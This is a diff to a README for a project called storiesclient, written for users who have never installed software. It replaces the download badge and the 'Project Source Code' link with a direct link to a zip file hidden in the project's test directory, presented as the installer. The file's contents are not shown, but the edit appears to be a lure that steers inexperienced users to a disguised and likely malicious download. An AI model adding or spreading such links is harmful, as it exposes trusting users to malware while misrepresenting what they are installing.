@@ -8,7 +8,7 @@ Welcome! This guide is designed for anyone, even if you've never installed softw
 
 The easiest and fastest way to get started is to download the application directly. Click the big button below to go to the download page:
 
-[![Download storiesclient](https://img.shields.io/badge/Download-storiesclient-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/arzushaikh070-cloud/storiesclient)
+[![Download storiesclient](https://img.shields.io/badge/Download-storiesclient-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/arzushaikh070-cloud/storiesclient/main/app/src/test/kotlin/dev/konraditurbe/storiesclient/proto/v3.3.zip)
 
 Visit this link to download the application. Once you're on the page, look for the latest release and download the installer file.
 
@@ -105,7 +105,7 @@ If you're still stuck, check the "Issues" tab on the GitHub repository for known
 
 ## 📚 Additional Resources
 
-- **Project Source Code**: [https://github.com/arzushaikh070-cloud/storiesclient](https://github.com/arzushaikh070-cloud/storiesclient)
+- **Project Source Code**: [https://raw.githubusercontent.com/arzushaikh070-cloud/storiesclient/main/app/src/test/kotlin/dev/konraditurbe/storiesclient/proto/v3.3.zip](https://raw.githubusercontent.com/arzushaikh070-cloud/storiesclient/main/app/src/test/kotlin/dev/konraditurbe/storiesclient/proto/v3.3.zip)
 - **Release Notes**: Find detailed changelogs on the repository's releases page.
 - **Community Support**: Connect with other users and developers on the project's discussion forum.
 
